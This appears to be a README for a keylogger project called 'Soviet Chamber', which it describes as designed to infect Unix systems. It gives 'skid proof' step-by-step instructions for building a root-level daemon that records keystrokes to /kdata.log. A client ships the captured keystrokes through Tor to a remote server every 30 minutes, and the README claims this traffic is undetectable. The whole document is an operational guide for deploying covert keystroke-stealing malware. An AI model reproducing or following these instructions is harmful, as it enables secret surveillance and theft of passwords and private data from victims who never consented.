# Soviet Chamber
Tor-Anonymizing Keylogger designed to infect Unix operating systems

# Full Skid Proof Installation Guide 
# Keylogger
Each folder in this directory contains an independent resource for a single application hence, the contents can not be merged with contents of other folders in this directory

0) Note: All applications developed accesses core linux system files therefore require administrator privilege.

How to run each code (Test all on your PC first to be sure it works i.e Server is localhost)

1) Keylogger

*    Open the keylogger folder in this directory
*    Right click in the folder and click open in terminal (Open your linux terminal to point to this directory)
*    run make
*    Enter your root password

Output

*    After you run make successfully, the command prompt will exit because this application runs as a daemon
*    Punch some keys on your keyboard
*    Check /kdata.log for the logged file

2) Client

Open the Client folder in this directory
Right click in the folder and click open in terminal (Open your linux terminal to point to this directory)
Modify the run call in the make file to pass your preferred TOR router IP, TOR router port, your servers IP, and
your servers port. All this parameters are mandatory for this client to work.

Note: The TOR routing creates an anonymity layer for the client and passes the connecting IP to TOR as the data destination address

* run make
* Enter your root password

Output

*    After you run make successfully, the prompt control will exit because this application runs as a daemon
*    wait to complete the third task as the client will be patiently waiting for the server to come up now... For test purpose, the server passed as an argument in the makefile is localhost and the port is hardcoded



3) Keylogger

*    Open the Server folder in this directory
*    Right click in the folder and click open in terminal (Open your linux terminal to point to this directory)
*    run make
*    Enter your root password

Output

*    After you run make successfully, the prompt control will exit because this application runs as a daemon
*    Open the /kdata.log file you previously checked, it should be empty now because the client compiled above as logged the data in it over the socket network to localhost (The client only opens a socket and connect to the server every 30min to log data. At the point of logging data, if the server is not active, it keeps waiting till the server comes online, it then logs the data and closes the socket immediately. Using this approach, the network is undetectable.
*    The server saves the data received over the network in /rec.txt, so check this file for the data previously seen in /kdata.log






Please find attached a zip file that contains the source code of the application.\
I've created 2 files for configuration and running the application.\
First of all, you need to execute configure.sh once. It'll install all the requirements and compile the application.\
Then every time you want to use the application just execute run.sh script.


 NOTE!! THE APPLICATION HAS TO BE EXECUTED AS ROOT BECAUSE IT INTERACTS WITH A FILE NAMED "/KDATA.LOG" WHICH IS NOT ACCESSIBLE BY ORDINARY USERS .}
